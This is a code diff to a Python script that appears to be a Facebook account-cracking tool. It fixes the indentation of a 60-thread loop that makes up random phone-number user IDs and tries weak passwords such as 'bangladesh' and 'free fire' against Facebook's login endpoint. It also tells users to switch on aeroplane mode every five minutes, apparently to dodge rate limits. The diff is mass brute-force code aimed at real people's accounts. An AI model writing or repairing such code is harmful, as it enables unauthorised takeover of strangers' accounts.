@@ -236,7 +236,6 @@ def Main():
 
 def file_crack_menu():
     pass
-
 def BDXr(code, limit):
     clear()
     print(logo)
@@ -246,22 +245,23 @@ def BDXr(code, limit):
     print("[*] USE AEROPLANE MODE IN EVERY 5 MIN")
     print(45 * "-")
 
-    # মাল্টি-থ্রেডিং ব্যবহার করে একসাথে অনেকগুলো রিকোয়েস্ট পাঠানোর লজিক
-with ThreadPoolExecutor(max_workers=60) as ghx:
-    for _ in range(int(limit)):
-        number = ''.join(random.choice(string.digits) for _ in range(7))
-        uid = code + number
+    with ThreadPoolExecutor(max_workers=60) as ghx:
+        for _ in range(int(limit)):
+            number = ''.join(random.choice(string.digits) for _ in range(7))
+            uid = code + number
 
-        psw_list = [
-            uid,
-            number,
-            code + number[:4],
-            "bangladesh",
-            "free fire"
-        ]
+            psw_list = [
+                uid,
+                number,
+                code + number[:4],
+                "bangladesh",
+                "free fire"
+            ]
 
-        for pw in psw_list:
-            ghx.submit(login, uid, pw, ugen())    
+            # ✅ IMPORTANT: loop must be inside
+            for pw in psw_list:
+                ghx.submit(login, uid, pw, ugen())
+    
 
 def login(email, password, user_agent):
     url = "https://b-graph.facebook.com/auth/login"
